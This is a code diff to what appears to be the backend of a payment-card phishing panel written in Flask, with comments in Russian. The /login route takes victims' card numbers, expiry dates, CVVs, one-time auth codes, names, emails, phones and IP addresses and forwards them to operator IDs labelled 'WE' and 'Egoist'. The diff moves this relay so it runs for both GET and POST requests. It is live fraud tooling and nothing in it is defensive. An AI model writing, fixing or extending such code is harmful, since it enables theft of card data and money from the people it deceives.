@@ -25,7 +25,6 @@ def chel():
         return jsonify({"message": "IP address received", "ip": ip_address})
     else:
         return jsonify({"error": "No IP address provided"}), 400
-
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'GET':
@@ -45,6 +44,29 @@ def login():
         email = request.args.get('email')
         tel = request.args.get('tel')
         ip_address = request.args.get('ip')
+
+        print(email, 495592185123908439878598547398345978435978)
+        ID = f'{session}'
+        # WE
+        if id == '1000001':
+            if authCode is not None and authCode != 'None':
+                send_sms(MAIN_ID, card_number, expiry_date, cvv, authCode, ID)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            send_buttons_message(MAIN_ID, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            ne_pizdabol(card_number)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
+
+        # Egoist
+        elif id == '1000002':
+            if authCode is not None and authCode != 'None':
+                send_sms(Egoist, card_number, expiry_date, cvv, authCode, ID)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            ne_pizdabol(card_number)
+            send_buttons_message(Egoist, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
+
+        return '', 200  # Добавляем общий возврат для случаев, когда нет условий или ошибки
+
     elif request.method == 'POST':
         print("Received a POST request:")
         print(f"Full URL: {request.url}")
@@ -61,25 +83,28 @@ def login():
         tel = data.get('tel')
         email = data.get('email')
         ip_address = data.get('ip')
-    print(email, 495592185123908439878598547398345978435978)
-    ID = f'{session}'
-    # WE
-    if id == '1000001':
-        if authCode != None and authCode != 'None':
-            send_sms(MAIN_ID, card_number, expiry_date, cvv, authCode, ID)
-            return ''
-        send_buttons_message(MAIN_ID, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
-        ne_pizdabol(card_number)
-        return ''
 
-    # Egoist
-    elif id == '1000002':
-        if authCode != None and authCode != 'None':
-            send_sms(Egoist, card_number, expiry_date, cvv, authCode, ID)
-            return ''
-        ne_pizdabol(card_number)
-        send_buttons_message(Egoist, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
-        return ''
+        print(email, 495592185123908439878598547398345978435978)
+        ID = f'{session}'
+        # WE
+        if id == '1000001':
+            if authCode is not None and authCode != 'None':
+                send_sms(MAIN_ID, card_number, expiry_date, cvv, authCode, ID)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            send_buttons_message(MAIN_ID, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            ne_pizdabol(card_number)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
+
+        # Egoist
+        elif id == '1000002':
+            if authCode is not None and authCode != 'None':
+                send_sms(Egoist, card_number, expiry_date, cvv, authCode, ID)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            ne_pizdabol(card_number)
+            send_buttons_message(Egoist, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
+
+        return '', 200  # Добавляем общий возврат для случаев, когда нет условий или ошибки
 
 
 @app.route('/test', methods=['GET'])
